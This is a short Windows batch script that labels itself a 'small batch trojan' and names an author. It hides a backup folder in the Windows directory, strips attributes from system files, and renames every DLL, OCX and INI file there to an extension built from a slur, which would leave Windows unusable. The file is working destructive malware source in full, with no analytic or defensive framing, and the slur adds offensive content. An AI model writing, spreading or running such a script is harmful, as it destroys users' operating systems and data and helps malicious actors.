@ECHO OFF

:::::::::::::::::::::::::::::::::::
:: SMALL BATCH TROJAN BY $I0N_XP ::
:::::::::::::::::::::::::::::::::::

MD %WINDIR%\_BACKUP

ATTRIB %WINDIR%\_BACKUP +H
ATTRIB %WINDIR%\*.* -A -H -R

COPY %WINDIR%\*.DLL %WINDIR%\_BACKUP >NUL
COPY %WINDIR%\*.OCX %WINDIR%\_BACKUP >NUL
COPY %WINDIR%\*.INI %WINDIR%\_BACKUP >NUL

REN %WINDIR%\*.DLL *.GAY
REN %WINDIR%\*.OCX *.GAY
REN %WINDIR%\*.INI *.GAY

EXIT
@ECHO ON